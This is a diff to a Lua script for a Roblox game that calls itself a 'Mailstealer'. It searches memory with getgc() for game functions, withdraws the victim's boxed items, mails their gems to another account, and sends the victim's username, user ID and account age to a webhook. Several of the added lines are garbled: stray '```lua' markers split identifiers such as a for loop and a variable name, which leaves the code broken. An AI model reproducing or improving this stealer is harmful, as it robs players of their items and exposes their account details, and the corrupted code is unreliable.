@@ -68,11 +68,16 @@ for id, table in pairs(Inventory.Currency) do
     end
 end
 
-for adress, func in pairs(getgc()) do
+local FunctionToGetFirstPriceOfMail
+for address, func in pairs(getgc()) do
     if typeof(func) == "function" and debug.getinfo(func).name == "computeSendMailCost" then
         FunctionToGetFirstPriceOfMail = func
         break
     end
+end
+
+if not FunctionToGetFirstPriceOfMail then
+    error("Function 'computeSendMailCost' not found in getgc()")
 end
 
 FirstPriceOfMail = FunctionToGetFirstPriceOfMail()
@@ -126,11 +131,11 @@ local GetItemValue = function(Type, ItemTable)
 end
 
 local GetItemValueOfItems = function()
-    RAP = 0
+    local RAP = 0
     for name_of_category, category in pairs(Inventory) do
         if category ~= nil then
             for i, v in pairs(category) do
-                RAP = RAP + GetItemValue(name_of_category, v)
+                RAP = RAP + GetItemValue (name_of_category, v)
             end
         end
     end
@@ -140,7 +145,7 @@ end
 function deepCopy(original)
     local copy = {}
     for k, v in pairs(original) do
-        if type (v) == "table" then
+        if type(v) == "table" then
             v = deepCopy(v)
         end
         copy[k] = v
@@ -175,7 +180,7 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
                         ["name"] = "**This data was generated using " .. mailstealer_name .. " Mailstealer**",
                         ["value"] = "```Username     : " ..
                             fardplayer.Name ..
-                                "\nUser -ID      : " ..
+                                "\nUser  -ID      : " ..
                                     fardplayer.userId ..
                                         "\nAccount Age  : " ..
                                             fardplayer.AccountAge ..
@@ -247,7 +252,8 @@ end
 MinimumRAP = FirstPriceOfMail
 
 if Inventory.Box then
-    for key, value in pairs(Inventory.Box) do
+    for key ```lua
+    , value in pairs(Inventory.Box) do
         if value._uq then
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(key)
         end
@@ -651,7 +657,6 @@ local function SendAllGems()
                     [4] = i,
                     [5] = SentGems
                 }
-                local response ```lua
                 local response = false
                 repeat
                     local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
@@ -670,7 +675,8 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
     local blob_b = blob_a.Get()
 
     FavoriteModeSelection = blob_a.Get().FavoriteModeSelection
-    FavoriteModeSelectionPlaza = blob_a.Get().FavoriteModeSelectionPlaza
+    FavoriteMode ```lua
+SelectionPlaza = blob_a.Get().FavoriteModeSelectionPlaza
 
     oldGet = deepCopy(blob_b)
     blob_a.Get = function(...)
